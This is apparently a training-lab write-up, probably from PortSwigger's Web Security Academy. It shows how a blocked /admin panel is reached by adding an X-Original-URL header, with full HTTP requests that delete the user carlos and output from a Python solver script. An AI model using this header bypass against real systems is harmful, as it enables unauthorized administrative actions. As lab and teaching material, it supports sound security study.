# Lab: URL-based access control can be circumvented

### Instructions

This website has an unauthenticated admin panel at `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the `X-Original-URL` header.

To solve the lab, access the admin panel and delete the user `carlos`. 

### Solution

Clicking on the admin panel at `/admin` we get an access denied message:

```
"Access denied"
```

Knowing we can use the header `X-original-URL` we can capture the home page in Burp and manually add the header to the request:

```
GET / HTTP/2
Host: 0a8000370328937c809dda6500900039.web-security-academy.net
Cookie: session=LwBjwweenm4RALOPHczvVvSkQ7af1XHN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8000370328937c809dda6500900039.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Original-Url: /admin
```

This forwards us to the `/admin` page:

```html
                       <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

We can then modify our request to delete the user Carlos:

```
GET /?username=carlos HTTP/2
Host: 0a8000370328937c809dda6500900039.web-security-academy.net
Cookie: session=LwBjwweenm4RALOPHczvVvSkQ7af1XHN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8000370328937c809dda6500900039.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Original-Url: /admin/delete
```

Which marks the lab as solved.

### Python Solution

See `access_control_10.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_10_url-based_access_control_can_be_circumvented]
└─$ python access_control_10.py https://0a83005f03e381c88261920e0069006d.web-security-academy.net/
[+] Successfully deleted user carlos
```